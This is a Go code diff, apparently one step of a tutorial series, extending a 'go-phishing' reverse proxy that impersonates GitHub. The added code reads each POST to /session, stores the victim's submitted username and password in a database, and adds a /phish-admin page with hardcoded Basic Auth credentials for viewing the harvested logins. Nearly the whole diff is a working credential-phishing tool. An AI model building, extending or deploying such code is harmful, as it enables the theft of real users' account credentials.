@@ -2,7 +2,7 @@
 package main
 
 import (
-	"fmt"
+	"bytes"
 	"go-phishing/db" //import db package
 	"io/ioutil"
 	"net/http"
@@ -80,7 +80,18 @@ func handler(w http.ResponseWriter, r *http.Request) {
 func cloneRequest(r *http.Request) *http.Request {
 	// 取得原請求的 method、body
 	method := r.Method
-	body := r.Body
+
+	// 透過session的請求，擷取user送出的帳號密碼
+	// 把 body 讀出來轉成 string
+	bodyByte, _ := ioutil.ReadAll(r.Body)
+	bodyStr := string(bodyByte)
+
+	// 如果是 POST 到 /session 的請求
+	// 就把 body 存進資料庫內（帳號密碼 GET !!）
+	if r.URL.String() == "/session" && r.Method == "POST" {
+		db.Insert(bodyStr)
+	}
+	body := bytes.NewReader(bodyByte)
 
 	// 取得原請求的 url，把它的域名替換成真正的 Github
 	path := r.URL.Path
@@ -173,20 +184,43 @@ func replaceURLInResp(body []byte, header http.Header) []byte {
 	return []byte(bodyStr)
 }
 
+//用來撈擷取到的資料給前端
+func adminHandler(w http.ResponseWriter, r *http.Request) {
+	//需要先通過帳號驗證，才能看收集到的資料
+	// 取得使用者輸入的帳號密碼
+	username, password, ok := r.BasicAuth()
+
+	// 判斷帳密對錯
+	if username == "shun" && password == "test" && ok {
+		// 對的話就從資料庫撈資料
+		strs := db.SelectAll()
+		w.Write([]byte(strings.Join(strs, "\n\n")))
+	} else {
+		// 告訴瀏覽器這個頁面需要 Basic Auth
+		w.Header().Add("WWW-Authenticate", "Basic")
+
+		// 回傳 `401 Unauthorized`
+		w.WriteHeader(401)
+		w.Write([]byte("我不認識你，不給你看勒"))
+	}
+}
+
 func main() {
 	db.Connect() //connect to db
 	//新增兩筆資料在印出來
-	db.Insert("Hello World")
-	db.Insert("I'm Larry Lu")
-	for _, str := range db.SelectAll() {
-		fmt.Println(str)
-	}
+	// db.Insert("Hello World")
+	// db.Insert("I'm Larry Lu")
+	// for _, str := range db.SelectAll() {
+	// 	fmt.Println(str)
+	// }
 	// 在 main 裡面使用 logrus
 	l := logrus.New()
 
 	l.Info("Server successful run on 8080 port")
-	//l.Warn("This is a warning")
-	//l.Error("This is an error")
+
+	// 路徑是 /phish-admin 才交給 adminHandler 處理
+	http.HandleFunc("/phish-admin", adminHandler)
+	// 其他的請求就交給 handler 處理
 	http.HandleFunc("/", handler)
 	// 錯誤處理，如果有回傳錯誤就直接終止程式並return error
 	err := http.ListenAndServe(":8080", nil)
